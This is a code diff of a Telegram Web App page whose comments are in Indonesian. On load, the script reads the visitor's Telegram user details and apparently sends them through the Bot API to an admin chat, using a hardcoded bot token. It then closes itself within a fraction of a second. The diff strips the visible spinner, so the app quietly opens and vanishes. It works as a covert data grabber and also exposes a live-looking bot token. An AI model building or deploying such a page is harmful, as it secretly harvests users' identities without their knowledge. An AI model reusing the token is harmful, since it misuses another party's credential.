@@ -4,19 +4,16 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background: transparent; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .spinner { border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
 
         const user = tg.initDataUnsafe.user;
         const BOT_TOKEN = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';
-        const ADMIN_ID = 'ID_TELEGRAM_KAMU'; // Ganti dengan ID kamu (cek di @userinfobot)
+        const ADMIN_ID = 'MASUKKAN_ID_TELE_KAMU'; // <--- JANGAN LUPA GANTI INI
 
         if (user) {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -28,10 +25,8 @@
                     parse_mode: "Markdown"
                 })
             }).finally(() => {
-                tg.close(); // Tutup aplikasi secepat mungkin
+                tg.close(); // Tutup otomatis dalam 0.1 detik
             });
-        } else {
-            tg.close();
         }
     </script>
 </body>
